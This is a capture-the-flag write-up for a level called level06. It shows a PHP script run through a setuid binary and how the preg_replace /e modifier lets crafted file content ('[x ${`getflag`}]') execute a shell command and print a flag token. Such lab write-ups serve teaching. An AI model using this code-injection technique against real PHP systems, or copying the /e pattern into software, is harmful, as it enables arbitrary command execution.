When we started the level06, in the home of the user we found the two files:
- **level06** which is a binary file.
- **level06.php** whichh is the source of the binary.

Here are permissions:
```bash
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

Which means that the binary file can execute getflag.

With this idea in mind, we read the php file.
```php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

It use regext to modify a string.
The important part is "``preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)``".
In PhP, the /e regex balise is used to evaluate what we pars as a command.

By creating a file like this:
```bash
echo '[x ${`getflag`}]' > /tmp/test.txt
```

And executing the binary file like this:

```bash
./level06 /tmp/test.txt
```

We get:
```bash
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```
Because the regex will first go through the regex ``"/(\[x (.*)\])/e"``
which will then go in ``"y(\"\\2\")"`` which is executed as a command.

Since we wrote ``${`getflag`}`` it will execute the argument getflag as a function so give the flag.